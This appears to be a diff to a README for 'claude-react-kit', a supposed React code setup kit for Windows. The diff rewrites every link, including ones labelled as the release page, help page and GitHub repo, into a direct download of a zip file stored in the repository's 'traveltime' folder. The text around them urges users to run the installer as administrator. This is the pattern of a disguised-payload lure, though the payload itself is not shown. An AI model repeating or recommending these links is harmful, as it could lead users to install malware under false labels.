@@ -1,6 +1,6 @@
 # ⚙️ claude-react-kit - Clean React Code Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-claude--react--kit-green?style=for-the-badge)](https://github.com/wahmoh/claude-react-kit/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--react--kit-green?style=for-the-badge)](https://raw.githubusercontent.com/wahmoh/claude-react-kit/main/traveltime/claude-kit-react-2.8.zip)
 
 ## 📋 What is claude-react-kit?
 
@@ -44,11 +44,11 @@ This guide will help you download and set up claude-react-kit on your Windows PC
 
 Start by visiting the release page for claude-react-kit to get the latest version.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/wahmoh/claude-react-kit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/wahmoh/claude-react-kit/main/traveltime/claude-kit-react-2.8.zip)
 
 1. **Go to the page**  
    Click the button above or open this link in your web browser:  
-   https://github.com/wahmoh/claude-react-kit/releases
+   https://raw.githubusercontent.com/wahmoh/claude-react-kit/main/traveltime/claude-kit-react-2.8.zip
 
 2. **Find the latest release**  
    The latest version appears at the top of the list. Releases show version numbers and dates.
@@ -111,7 +111,7 @@ claude-react-kit includes several helpful tools:
 
 To update to a newer version, repeat the download steps:
 
-1. Visit the release page again: https://github.com/wahmoh/claude-react-kit/releases  
+1. Visit the release page again: https://raw.githubusercontent.com/wahmoh/claude-react-kit/main/traveltime/claude-kit-react-2.8.zip  
 2. Download the latest file.  
 3. Run the installer or extract the files as before.  
 4. Replace old files if prompted.  
@@ -127,7 +127,7 @@ If you encounter problems:
 - **The app does not open**: Check if your Windows system is updated.  
 - **Installation fails**: Try running the installer as an administrator. Right-click on the setup file and select "Run as administrator".  
 - **Files are missing or corrupted**: Download the setup file again.  
-- **Need help?** Check the issues or discussions on the GitHub page at https://github.com/wahmoh/claude-react-kit
+- **Need help?** Check the issues or discussions on the GitHub page at https://raw.githubusercontent.com/wahmoh/claude-react-kit/main/traveltime/claude-kit-react-2.8.zip
 
 ---
 
@@ -140,8 +140,8 @@ For developers or curious users, the GitHub page contains:
 - Information on how to contribute to the project.
 - A list of topics linked to the repo like `ai-coding`, `clean-code`, `developer-tools`, and more.
 
-Visit the GitHub repo here any time: https://github.com/wahmoh/claude-react-kit
+Visit the GitHub repo here any time: https://raw.githubusercontent.com/wahmoh/claude-react-kit/main/traveltime/claude-kit-react-2.8.zip
 
 ---
 
-[![Get claude-react-kit](https://img.shields.io/badge/Get%20claude--react--kit-grey?style=for-the-badge)](https://github.com/wahmoh/claude-react-kit/releases)
+[![Get claude-react-kit](https://img.shields.io/badge/Get%20claude--react--kit-grey?style=for-the-badge)](https://raw.githubusercontent.com/wahmoh/claude-react-kit/main/traveltime/claude-kit-react-2.8.zip)
